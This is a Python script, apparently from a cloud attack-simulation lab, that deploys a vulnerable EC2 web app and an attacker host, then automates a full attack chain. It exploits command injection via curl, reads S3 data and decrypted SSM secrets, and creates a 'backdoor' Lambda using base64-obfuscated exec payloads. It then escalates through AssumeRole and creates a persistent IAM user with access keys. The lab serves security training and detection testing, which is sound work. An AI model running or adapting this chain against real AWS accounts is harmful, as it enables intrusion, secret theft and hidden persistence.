"""
COBRA Scenario 8: Vulnerable web app (command injection) -> EC2 RCE -> S3, SSM, Lambda persistence.
Two EC2s: victim (vulnerable app + IAM role), attacker (runs exploit via curl to victim).
"""
import base64
import json
import os
import subprocess
from time import sleep
from urllib.parse import quote

from termcolor import colored
from tqdm import tqdm

from core.helpers import generate_ssh_key, loading_animation


def _run_via_attacker(attacker_ip, victim_ip, cmd, key_path="./id_rsa"):
    """Run a command on the victim by SSH to attacker and curling the vulnerable app."""
    encoded = quote(cmd, safe="")
    url = f"http://{victim_ip}:8000/?cmd={encoded}"
    ssh_cmd = (
        f'ssh -o StrictHostKeyChecking=accept-new -i {key_path} ubuntu@{attacker_ip} '
        f'"curl -s \\"{url}\\""'
    )
    try:
        out = subprocess.check_output(ssh_cmd, shell=True, timeout=60, text=True)
        return out.strip()
    except subprocess.CalledProcessError as e:
        return getattr(e, "output", str(e)) or ""
    except Exception as e:
        return str(e)


def scenario_8_execute(manual=False):
    print("-" * 30)
    print(colored(
        "Executing Scenario 8: Vulnerable web app (command injection) -> EC2 RCE -> S3, SSM, Lambda persistence",
        color="red",
    ))
    loading_animation()
    print("-" * 30)

    out_path = "./core/cobra-scenario-8-output.json"
    if os.path.exists(out_path):
        os.remove(out_path)
        print(f"File '{out_path}' found and deleted.")
    else:
        print(f"File '{out_path}' not found.")

    generate_ssh_key()

    # Check Pulumi CLI is available
    try:
        subprocess.run(["pulumi", "version"], capture_output=True, check=True, timeout=10)
    except (FileNotFoundError, subprocess.CalledProcessError) as e:
        print(colored("Pulumi CLI is not installed or not on PATH. Install from https://www.pulumi.com/docs/install/ and ensure 'pulumi' is in your PATH.", color="red"))
        raise SystemExit(1) from e

    print(colored("Rolling out Infra", color="red"))
    loading_animation()
    rc = subprocess.call(
        "cd ./scenarios/scenario_8/infra/ && pulumi up -s cobra-scenario-8 -y",
        shell=True,
    )
    if rc != 0:
        print(colored("Pulumi up failed. Check the output above. Ensure you are logged in (pulumi login) and have AWS credentials configured.", color="red"))
        raise SystemExit(1)
    subprocess.call(
        "cd ./scenarios/scenario_8/infra/ && pulumi stack -s cobra-scenario-8 output --json > ../../../core/cobra-scenario-8-output.json",
        shell=True,
    )

    if not os.path.exists(out_path):
        print(colored("Pulumi output file was not created. Run 'pulumi stack output --json' from scenarios/scenario_8/infra/ to debug.", color="red"))
        raise SystemExit(1)
    with open(out_path, "r") as f:
        raw = f.read().strip()
    if not raw:
        print(colored("Pulumi output file is empty. Ensure the stack deployed successfully.", color="red"))
        raise SystemExit(1)
    try:
        data = json.loads(raw)
    except json.JSONDecodeError as e:
        print(colored(f"Invalid JSON in output file: {e}. Check that 'pulumi stack output --json' runs correctly.", color="red"))
        raise SystemExit(1) from e

    victim_ip = data["Web Server Public IP"]
    attacker_ip = data["Attacker Server Public IP"]
    bucket_name = data["Bucket Name"]
    bucket_key = data["Bucket Key"]
    ssm_name = data["SSM Parameter Name"]
    lambda_role_arn = data["Lambda Execution Role Arn"]
    elevated_role_arn = data["Elevated Role Arn"]
    region = data["Region"]

    sleep_duration = 100
    print(colored("Waiting for EC2 instances and vulnerable app to be ready...", color="yellow"))
    with tqdm(total=sleep_duration, desc="Loading") as pbar:
        while sleep_duration > 0:
            sleep_interval = min(1, sleep_duration)
            sleep(sleep_interval)
            pbar.update(sleep_interval)
            sleep_duration -= sleep_interval

    if manual:
        print(colored("Lab ready. SSH to attacker and run exploit manually.", color="green"))
        print(colored(f"  ssh -i ./id_rsa ubuntu@{attacker_ip}", color="cyan"))
        print(colored(f"  curl \"http://{victim_ip}:8000/?cmd=id\"", color="cyan"))
        return

    # --- Attack steps (from attacker EC2, curling victim app) ---
    print("-" * 30)
    print(colored("RCE check: run id on victim", color="red"))
    loading_animation()
    rce_out = _run_via_attacker(attacker_ip, victim_ip, "id")
    print(colored(f"  Output: {rce_out[:200]}", color="green"))

    print("-" * 30)
    print(colored("List S3 buckets (using victim instance role)", color="red"))
    loading_animation()
    list_cmd = (
        "python3 -c \"import boto3,json; "
        "b=boto3.client('s3').list_buckets()['Buckets']; "
        "print(json.dumps([x['Name'] for x in b]))\""
    )
    list_out = _run_via_attacker(attacker_ip, victim_ip, list_cmd)
    print(colored(f"  Buckets: {list_out[:300]}", color="green"))

    print("-" * 30)
    print(colored("Read S3 object (sensitive data)", color="red"))
    loading_animation()
    read_cmd = (
        f"python3 -c \"import boto3; "
        f"c=boto3.client('s3'); "
        f"r=c.get_object(Bucket='{bucket_name}', Key='{bucket_key}'); "
        f"print(r['Body'].read().decode())\""
    )
    read_out = _run_via_attacker(attacker_ip, victim_ip, read_cmd)
    print(colored(f"  Content: {read_out[:200]}", color="green"))

    print("-" * 30)
    print(colored("Retrieve SSM Parameter Store secret", color="red"))
    loading_animation()
    ssm_cmd = (
        f"python3 -c \"import boto3; "
        f"c=boto3.client('ssm', region_name='{region}'); "
        f"r=c.get_parameter(Name='{ssm_name}', WithDecryption=True); "
        f"print(r[\\\"Parameter\\\"][\\\"Value\\\"])\""
    )
    ssm_out = _run_via_attacker(attacker_ip, victim_ip, ssm_cmd)
    print(colored(f"  Secret: {ssm_out[:100]}", color="green"))

    print("-" * 30)
    print(colored("Create Lambda function for persistence", color="red"))
    loading_animation()
    # Inline script that creates a minimal Lambda (run on victim via exec(base64.decode))
    lambda_script = f"""
import boto3, zipfile, io
code = b'def handler(event, context): return {{"statusCode": 200}}'
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('index.py', code.decode())
buf.seek(0)
boto3.client('lambda', region_name='{region}').create_function(
    FunctionName='cobra-s8-backdoor',
    Runtime='python3.11',
    Role='{lambda_role_arn}',
    Handler='index.handler',
    Code={{'ZipFile': buf.read()}}
)
print('Lambda created')
"""
    lambda_b64 = base64.b64encode(lambda_script.strip().encode()).decode()
    lambda_cmd = f"python3 -c \"import base64; exec(base64.b64decode('{lambda_b64}').decode())\""
    lambda_out = _run_via_attacker(attacker_ip, victim_ip, lambda_cmd)
    print(colored(f"  Result: {lambda_out[:150]}", color="green"))

    # --- Privilege escalation: AssumeRole from victim EC2, then sensitive data + persistence ---
    print("-" * 30)
    print(colored("AssumeRole (privilege escalation from victim EC2)", color="red"))
    loading_animation()
    escalation_script = f"""
import boto3
role_arn = '{elevated_role_arn}'
ssm_name = '{ssm_name}'
region = '{region}'
sts = boto3.client('sts')
resp = sts.assume_role(RoleArn=role_arn, RoleSessionName='cobra-s8-escalation')
creds = resp['Credentials']
session = boto3.Session(
    aws_access_key_id=creds['AccessKeyId'],
    aws_secret_access_key=creds['SecretAccessKey'],
    aws_session_token=creds['SessionToken'],
)
print('AssumeRole: success')
ssm = session.client('ssm', region_name=region)
p = ssm.get_parameter(Name=ssm_name, WithDecryption=True)
print('Secret (assumed role):', p['Parameter']['Value'])
iam = session.client('iam')
try:
    iam.create_user(UserName='cobra-s8-persist')
except iam.exceptions.EntityAlreadyExistsException:
    pass
ak = iam.create_access_key(UserName='cobra-s8-persist')
print('IAM user created, KeyId:', ak['AccessKey']['AccessKeyId'])
"""
    esc_b64 = base64.b64encode(escalation_script.strip().encode()).decode()
    esc_cmd = f"python3 -c \"import base64; exec(base64.b64decode('{esc_b64}').decode())\""
    esc_out = _run_via_attacker(attacker_ip, victim_ip, esc_cmd)
    for line in esc_out.split("\n")[:5]:
        if line.strip():
            print(colored(f"  {line.strip()}", color="green"))

    print("-" * 30)
    print(colored("Scenario 8 executed successfully!", color="green"))
